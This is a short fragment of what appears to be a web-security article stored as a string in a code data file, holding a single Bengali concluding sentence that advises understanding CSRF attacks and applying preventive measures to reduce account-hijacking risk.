কিভাবে CSRF অ্যাটাক কাজ করে সেটা জেনে এবং প্রোপার প্রিভেন্টিভ মেজার ইমপ্লিমেন্ট করার মাধ্যমে, আপনি আপনার ইউজারদের অ্যাকাউন্ট হাইজ্যাক হওয়ার রিস্ক কমাতে পারেন।
`,
  },
];
